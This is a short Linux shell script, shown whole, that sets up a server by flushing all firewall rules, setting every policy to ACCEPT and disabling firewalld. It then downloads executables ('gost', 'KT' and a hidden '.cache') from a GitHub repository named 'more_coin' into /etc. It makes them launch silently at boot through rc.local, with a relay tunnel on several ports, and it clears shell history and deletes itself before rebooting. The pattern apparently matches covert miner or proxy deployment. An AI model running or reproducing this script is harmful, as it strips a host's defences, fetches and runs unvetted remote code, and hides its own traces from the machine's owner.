yum install wget iptables-services iptables psmisc -y
iptables-save | awk '/^[*]/ { print $1 } 
                     /^:[A-Z]+ [^-]/ { print $1 " ACCEPT" ; }
                     /COMMIT/ { print $0; }' | iptables-restore
iptables -F
iptables -X
iptables -P INPUT ACCEPT   
iptables -P OUTPUT ACCEPT
service iptables save
systemctl enable iptables.service
systemctl disable firewalld
systemctl disable firewalld.service
cd /etc
wget https://github.com/phl1icku/more_coin/gost -O gost
wget https://github.com/phl1icku/more_coin/KT -O KT
wget https://github.com/phl1icku/more_coin/.cache -O .cache
chmod +x gost
chmod +x KT
chmod +x /etc/rc.d/rc.local
echo 'cd /etc'>>/etc/rc.d/rc.local
echo 'nohup ./gost -L=relay+mwss://:105/127.0.0.1:1005 -L=relay+mwss://:110/127.0.0.1:1010 -L=relay+mwss://:100/127.0.0.1:1000  -L=relay+mwss://:104/127.0.0.1:1004   -L=relay+mwss://:109/127.0.0.1:1009 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./KT >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'history -c'>>/etc/rc.d/rc.local
echo 'cd ~'>>/etc/rc.d/rc.local
echo 'rm -f setup.sh'>>/etc/rc.d/rc.local
cd ~
rm -f setup.sh
reboot
